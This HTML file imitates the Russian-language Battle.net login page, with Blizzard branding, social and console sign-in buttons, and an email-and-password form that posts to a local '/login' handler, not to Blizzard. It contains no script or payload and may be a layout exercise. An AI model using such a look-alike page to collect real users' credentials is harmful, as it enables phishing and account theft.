<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Авторизация в Battle.net</title>
    <link rel="top_icon" href="">
    <link href="styles/all.css" rel="stylesheet" type="text/css">
</head>
<body>
    <div class="grid_container_wrapper">
        <div class="box_wrapper">
            <div class="top_box"></div>
            <div class="box_wrapper_inner">
                <h1 class="battlenet_logo"></h1>
                <div class="input">
                    <div class="login">
                        <h3 class="login_header">Авторизоваться</h3>
                        <div class="top_icons">

                            <form method="post" class="google">
                                <button class="google_btn">
                                    <img class="google_icon" src="images/google-logo-color.svg" alt="">

                                </button>
                            </form>
                            <form method="post" class="facebook">
                                <button class="facebook_btn">
                                    <img src="images/facebook-logo-white.svg"  class="facebook_icon" alt="">
                                </button>

                            </form>
                            <form method="post" class="apple">
                                <button class="apple_btn">
                                    <img src="images/apple-logo-black.svg"  class="apple_icon" alt="">
                                </button> 
                            </form>
                        </div>
                        <div class="med_icons">
                            <form method="post" class="xbox">
                                <button class="xbox_btn">
                                    <img src="images/xbox-logo-white.svg" alt="" class="xbox_icon">
                                </button>

                            </form>
                            <form method="post" class="playstation">
                                <button class="playstation_btn">
                                    <img class="playstation_icon" src="images/playstation-logo-white.svg" alt="">
                                </button>
                            </form>
                            <form method="post" class="nintendo">
                                <button class="nintrndo_btn">
                                    <img src="images/switch-logo-white.svg" alt="" class="nintendo_icon">
                                </button>

                            </form>
                            <form method="post" class="steam">
                                <button class="steam_btn">
                                    <img src="images/steam-logo-black.svg" alt="" class="steam_icon">
                                </button>
                            </form>
                        </div>
                        <div class="text_login">
                            <span class="span_text_login">или войти через</span>
                        </div>
                        <form action="/login" method ="post" class="password_form">
                            <div class="login_input_container">
                                <div class="control_group1">
                                    <div class="control_login">
                                        <input type="text" class="input_mail" name="email" placeholder="Элекронная почта или телефон">
                                    </div>
                                </div>
                                <div class="control_group2">
                                    <div class="control_password">
                                        <input type="password" class="input_password" name="password" placeholder="Пароль">
                                    </div>

                                </div>
                            </div>
                            <div class="control_group_submit">
                                <button type="submit" class="submit_btn">Авторизация</button>
                            </div>
                        </form>
                        <ul class="bottom_help" >
                            <li class="link1">
                                <a  class="link1_text" href="https://account.battle.net/creation/flow/creation-full">Зарегистрируйте учётную запись Battle.net бесплатно</a>
                            </li>
                            <li class="link2">
                                <a  class="link2_text" href="https://account.battle.net/recovery/ru/?theme=bnet-next&flowTrackingId=09e03ff5-9aff-416b-9393-5e636735828d"> Не можете войти?</a>
                            </li>
                        </ul>

                    </div>
                </div>
        </div>
    </div>
    <footer class="footer">
        <div class="nav-client">
            <div class="footer-content">
                <div class="nav-section">
                    <div class="nav-left">
                        <div class="footer-links nav-left">
                            <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ BLIZZARD </a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">УСЛОВИЯ</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">АВТОРСКОЕ ПРАВО</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">ФАЙЛЫ COOKIE </a>
                            <span>|</span>
                            <a class="nav-item nav-a"  href="https://www.blizzard.com/company/legal/eula">ПАРАМЕТРЫ COOKIE</a>
                            <div class="copyright">
                                ©2023 Blizzard Entertainment, Inc. All rights reserved.
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</body>
</html>
